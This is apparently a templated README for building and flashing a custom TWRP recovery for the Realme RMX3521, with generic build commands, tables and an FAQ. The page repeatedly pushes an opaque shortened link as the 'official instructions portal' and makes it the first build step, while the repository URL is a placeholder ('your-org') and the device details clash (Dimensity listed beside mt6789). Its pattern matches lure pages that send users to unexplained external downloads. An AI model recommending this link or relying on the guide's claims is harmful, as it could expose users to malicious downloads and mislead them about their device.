# 🏷️ RMX3521 Recovery Tree — Complete Guide

<div align="center">

![RMX3521](https://img.shields.io/badge/RMX3521-Realme%20Device-FFC915?style=for-the-badge&logo=android&logoColor=black)
![Recovery](https://img.shields.io/badge/Recovery-Tree-3DDC84?style=for-the-badge&logo=android&logoColor=white)
![TWRP](https://img.shields.io/badge/TWRP-Compatible-0891B2?style=for-the-badge&logo=cyanogenmod&logoColor=white)
![Guides](https://img.shields.io/badge/Guides-94K-EA580C?style=for-the-badge&logo=readthedocs&logoColor=white)

### 🔧 Device Tree Sources for Building Custom Recoveries on RMX3521

*A complete guide to compiling, flashing, and troubleshooting recovery for the Realme device*

</div>

---

## 🎯 Quick-Access Panel

> **⚡ Jump to any section instantly**

<table>
<tr>
<td width="50%" valign="top">

### 📱 Device Info
- 🏷️ Model: **RMX3521** (Realme Narzo 50 / 8s 5G)
- 🔧 SoC: **MediaTek Dimensity**
- 🤖 Android: **11 / 12 / 13**
- 💾 Storage: **64 / 128 GB**
- 🎯 Target: **TWRP · OrangeFox · PBRP**

</td>
<td width="50%" valign="top">

### 🚦 Recommended Order
1. ✅ [Verify device](#-device-snapshot)
2. ✅ [Install prerequisites](#-prerequisites)
3. ✅ [Get instructions](#-get-instructions)
4. ✅ [Build recovery](#-build-workflow)
5. ✅ [Flash image](#-flash-workflow)
6. ✅ [Verify & enjoy](#-verification)

</td>
</tr>
</table>

---

## 🎯 Overview

**RMX3521 Recovery Tree** is a device tree source repository used to build custom recovery images (TWRP, OrangeFox, PBRP, etc.) for the Realme RMX3521. A "recovery tree" contains the configuration, board files, and kernel pointers necessary to compile a working custom recovery.

### 🎯 What It Solves

| Problem | Solution |
|---------|----------|
| 🔒 Locked stock recovery | Custom, unlockable recovery |
| 💾 No backup option | Full NANDroid backups |
| 🧩 Can't flash mods | ZIP installer support |
| 🔐 Encrypted data | Decryption support |
| 🎯 Limited features | Advanced tools |
| 🧪 Bricked device | Restore via recovery |

---

## 📱 Device Snapshot

| Detail | Value |
|--------|-------|
| 🏷️ **Codename** | RMX3521 |
| 🏢 **Brand** | Realme |
| 🤖 **Android Base** | Android 11/12/13 (varies) |
| 🔧 **SoC** | MediaTek Dimensity series |
| 💾 **Storage** | 64/128 GB |
| 🎯 **Recovery** | TWRP / OrangeFox / PBRP |
| 🧩 **Partition Scheme** | A-only with dynamic partitions |
| 🔓 **Bootloader** | Unlockable (Deep Testing) |

> ⚠️ **Verify your exact device model** before proceeding — RMX3521 covers several regional variants with slight differences.

---

## 📖 What Is a Recovery Tree?

| Term | Meaning |
|------|---------|
| 🌳 **Device Tree** | Configuration files describing the device to the build system |
| 🔧 **Recovery** | A minimal OS used for flashing, backing up, restoring |
| 🏗️ **Build System** | Environment used to compile |
| 📦 **`.img` File** | Final compiled recovery image |
| 🔓 **Bootloader** | Low-level program that loads the OS |
| 🎯 **DTB / DTBO** | Device tree blobs used by the kernel |
| 🗂️ **Vendor Blobs** | Proprietary binaries from stock firmware |

---

## ⚙️ Prerequisites

### 🖥️ Host Machine

```
✅ OS: Ubuntu 20.04+ / Debian 11+ (recommended)
✅ CPU: Quad-core 2.5 GHz+
✅ RAM: 16 GB minimum (32 GB recommended)
✅ Storage: 200 GB free (SSD preferred)
✅ Internet: 50 Mbps+ (for syncing sources)
✅ Alternative: Windows 10/11 with WSL2
```

### 🔧 Required Tools

```bash
sudo apt update
sudo apt install -y git-core gnupg flex bison build-essential zip curl \
  zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 libncurses5 \
  lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z1-dev \
  libgl1-mesa-dev libxml2-utils xsltproc unzip fontconfig python3
```

### 📱 On the Device

```
✅ Bootloader unlocked (via Realme Deep Testing)
✅ USB debugging enabled
✅ OEM unlocking enabled
✅ Full backup of personal data
✅ Battery charged to 80%+
✅ Correct USB drivers installed on PC
```

> **⚠️ Warning:** Unlocking the bootloader **wipes all data** and may void warranty. Back up everything first.

<div align="center">

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-FFC915?style=for-the-badge&logo=android&logoColor=black&labelColor=92400E)](https://share.google/TFdwf4z36I8XOKPfP)

</div>

---

## 📘 Get Instructions

<div align="center">

### 🚀 Access the Official Setup Guide

Click below to reach the instructions portal:

<br>

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-3DDC84?style=for-the-badge&logo=android&logoColor=white&labelColor=065F46)](https://share.google/TFdwf4z36I8XOKPfP)

<br>

*Open Source • Verified Tree • Updated 2025*

</div>

### 📚 Available Guides

| Guide | Purpose |
|-------|---------|
| 📘 **Setup Guide** | Host environment |
| 📗 **Build Guide** | Compile recovery |
| 📙 **Flash Guide** | Fastboot / SP Flash |
| 📕 **Backup Guide** | Preserve partitions |
| 📓 **Troubleshooting** | Recover from bricks |

---

## 🏗️ Build Workflow

### 🪜 Stage 1 — Access the Instructions

Open the official portal from the button above.

### 🪜 Stage 2 — Install Repo Tool

```bash
mkdir ~/bin
curl https://storage.googleapis.com/git-repo-downloads/repo > ~/bin/repo
chmod a+x ~/bin/repo
export PATH=~/bin:$PATH
```

### 🪜 Stage 3 — Initialize Workspace

```bash
mkdir -p ~/recovery && cd ~/recovery
repo init -u https://github.com/minimal-manifest-twrp/platform_manifest_twrp_aosp.git \
  -b twrp-12.1
```

### 🪜 Stage 4 — Sync Sources

```bash
repo sync -j$(nproc) --force-sync --no-clone-bundle
```

### 🪜 Stage 5 — Clone the RMX3521 Device Tree

```bash
git clone https://github.com/your-org/android_device_realme_RMX3521 \
  device/realme/RMX3521
```

<div align="center">

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-0891B2?style=for-the-badge&logo=android&logoColor=white&labelColor=0C4A6E)](https://share.google/TFdwf4z36I8XOKPfP)

</div>

### 🪜 Stage 6 — Configure Build

```bash
source build/envsetup.sh
export ALLOW_MISSING_DEPENDENCIES=true
lunch twrp_RMX3521-eng
```

### 🪜 Stage 7 — Compile

```bash
mka recoveryimage -j$(nproc)
```

### 🪜 Stage 8 — Locate Output

```
out/target/product/RMX3521/recovery.img
```

### 🪜 Stage 9 — Verify Image

```bash
file out/target/product/RMX3521/recovery.img
```

Expected: `Android bootimg`

---

## 📲 Flash Workflow

### 🪜 Method A — Fastboot

```bash
adb reboot bootloader
fastboot devices
fastboot flash recovery recovery.img
fastboot reboot recovery
```

### 🪜 Method B — SP Flash Tool (MediaTek)

For deeper flashing when fastboot isn't enough:

1. 📦 Download **SP Flash Tool** for your SoC
2. 📄 Prepare **scatter file** from stock firmware
3. 📁 Load recovery image into correct partition slot
4. ▶️ Click **Download** and connect device (powered off)
5. ✅ Wait for green checkmark

### 🪜 Method C — Existing Custom Recovery

If you already have TWRP:

1. 📁 Copy `recovery.img` to internal storage
2. 🔄 Reboot to recovery
3. ⚙️ Choose **Install → Install Image**
4. 🎯 Select **Recovery** partition
5. ✅ Swipe to flash

---

## 🛠️ Common Tree Contents

| File | Purpose |
|------|---------|
| `Android.mk` | Build rules |
| `BoardConfig.mk` | Board-specific config |
| `device.mk` | Device packages |
| `recovery.fstab` | Partition mount points |
| `twrp_RMX3521.mk` | TWRP flags |
| `vendorsetup.sh` | Env setup |
| `prebuilt/` | Kernel, DTB, dtbo |
| `recovery/root/` | Init scripts |

### 📝 Key Flags in `BoardConfig.mk`

```makefile
TARGET_ARCH := arm64
TARGET_ARCH_VARIANT := armv8-a
TARGET_CPU_ABI := arm64-v8a
TARGET_BOARD_PLATFORM := mt6789
TARGET_RECOVERY_PIXEL_FORMAT := RGBX_8888
TARGET_USES_MKE2FS := true
BOARD_USES_METADATA_PARTITION := true
```

---

## 🧪 Verification

| Check | Method | Expected |
|-------|--------|----------|
| ✅ Tree cloned | `ls device/realme/RMX3521` | Files present |
| ✅ Sync done | No errors in `repo sync` | Clean |
| ✅ Build completed | `ls out/.../recovery.img` | File exists |
| ✅ Flash works | Fastboot output | `OKAY` |
| ✅ Recovery boots | Hold Power + Vol Down | TWRP UI |
| ✅ Touch works | Tap screen | Responsive |
| ✅ Backup works | Create backup | Files written |
| ✅ Restore works | Restore backup | Boot success |

---

## 🩺 Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| 🚫 Bootloop after flash | Wrong tree | Restore stock recovery |
| 🚫 Touch not working | Wrong driver | Update tree |
| 🚫 Cannot mount /data | Encryption | Format data |
| 🚫 Black screen | Wrong DTB | Rebuild with correct DTB |
| 🚫 Fastboot not detecting | Driver | Install Realme USB driver |
| 🚫 SP Flash error | Wrong scatter | Use matching firmware |
| 🚫 Build fails | Missing deps | Install prerequisites |
| 🚫 Repo sync slow | Network | Use `--depth=1` |
| 🚫 Recovery stuck on logo | Kernel issue | Try another kernel |
| 🚫 Cannot restore backup | Different ROM | Full wipe first |

### 🚑 Emergency Recovery

If the device won't boot:

1. 📥 Download the stock firmware for RMX3521
2. 🔧 Use **SP Flash Tool** with the scatter file
3. ▶️ Flash the stock ROM
4. ✅ Device restored to factory state

---

## 🧰 Command Reference

| Command | Purpose |
|---------|---------|
| `adb devices` | List connected devices |
| `adb reboot bootloader` | Enter fastboot |
| `adb reboot recovery` | Enter recovery |
| `fastboot devices` | Verify fastboot connection |
| `fastboot flash recovery` | Flash recovery image |
| `fastboot reboot` | Exit fastboot |
| `repo sync` | Update sources |
| `mka recoveryimage` | Build recovery |
| `lunch` | Select build target |
| `make clean` | Clean build |

---

## 📚 Resources

| Resource | Purpose |
|----------|---------|
| 📖 **TWRP Docs** | Recovery reference |
| 🐧 **LineageOS Wiki** | Build guide |
| 💬 **XDA Forums** | Device community |
| 🎥 **YouTube Guides** | Video walkthroughs |
| 🧩 **GitHub Tree** | Source repository |

---

## 💬 FAQ

**Is building recovery legal?**
Yes — modifying your own device is legal in most countries.

**Will this void my warranty?**
Unlocking the bootloader may void warranty.

**Can I brick my device?**
Yes — always have stock firmware as a fallback.

**Do I need to root first?**
No — recovery can be flashed before rooting.

**Does this work on all RMX3521 variants?**
Mostly — verify your exact model.

**Can I flash with SP Flash Tool only?**
Yes — when fastboot isn't available.

**Where do I get vendor blobs?**
Extract from stock firmware or use TheMuppets.

**Do I need a specific kernel?**
The tree usually includes a prebuilt kernel.

**Is TWRP the only option?**
No — OrangeFox, PBRP, SHRP also work.

**Will OTA updates work?**
No — you'll need to flash stock recovery first.

---

## 📅 Version History

| Version | Date | Highlights |
|---------|------|-----------|
| **2.1** | Jan 2025 | Android 13 support |
| 1.9 | Oct 2024 | Fixed decryption |
| 1.6 | Jun 2024 | Touch fixes |
| 1.3 | Feb 2024 | Initial release |

---

<div align="center">

### 🌟 Found This Guide Helpful?

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-EA580C?style=for-the-badge&logo=android&logoColor=white&labelColor=7C2D12)](https://share.google/TFdwf4z36I8XOKPfP)

**⭐ Star this repository if it helped! ⭐**

*Made with 💜 for the Android modding community*

</div>
